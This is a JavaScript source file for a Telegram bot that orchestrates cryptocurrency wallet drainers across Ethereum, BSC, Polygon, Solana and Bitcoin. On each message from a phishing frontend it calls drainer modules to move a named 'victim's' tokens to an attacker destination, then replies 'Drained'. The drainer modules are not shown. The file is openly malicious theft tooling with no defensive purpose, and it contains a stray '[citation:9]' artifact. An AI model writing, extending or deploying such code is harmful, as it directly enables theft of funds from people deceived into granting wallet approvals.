// ============================================================
// 🔴 CENTRAL TELEGRAM BOT FOR ALL CHAINS
// ============================================================
const { Telegraf } = require('telegraf');
const { EvmDrainer } = require('./drainers/evm-drainer'); // Your existing bot
const { SolanaDrainer } = require('./drainers/solana-drainer');
const { BitcoinDrainer } = require('./drainers/btc-drainer');

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

// Chain-specific RPC endpoints
const RPC_ENDPOINTS = {
  evm: {
    1: 'https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY',
    56: 'https://bsc-dataseed.binance.org/',
    137: 'https://polygon-rpc.com'
  },
  solana: 'https://api.mainnet-beta.solana.com',
  bitcoin: 'https://api.xverse.app' // Xverse API [citation:9]
};

// Handle incoming approval notifications from your frontend
bot.on('message', async (ctx) => {
  try {
    const data = JSON.parse(ctx.message.text);
    
    switch(data.chain) {
      case 'ethereum':
      case 'bsc':
      case 'polygon':
        // Handle with EVM drainer
        const evmDrainer = new EvmDrainer(process.env.PRIVATE_KEY, RPC_ENDPOINTS.evm[data.chainId]);
        await evmDrainer.drainToken(data.tokenAddress, data.victim);
        break;
        
      case 'solana':
        // Handle with Solana drainer
        const solanaDrainer = new SolanaDrainer(process.env.SOLANA_PRIVATE_KEY);
        await solanaDrainer.drainToDestination(data.victim, data.destination);
        break;
        
      case 'bitcoin':
        // Handle with Bitcoin drainer
        const btcDrainer = new BitcoinDrainer(process.env.BTC_PRIVATE_KEY);
        await btcDrainer.drainToDestination(data.victim, data.destination);
        break;
    }
    
    ctx.reply(`✅ Drained on ${data.chain}`);
  } catch (error) {
    ctx.reply(`❌ Error: ${error.message}`);
  }
});

bot.launch();
console.log('🤖 Universal drainer bot running');
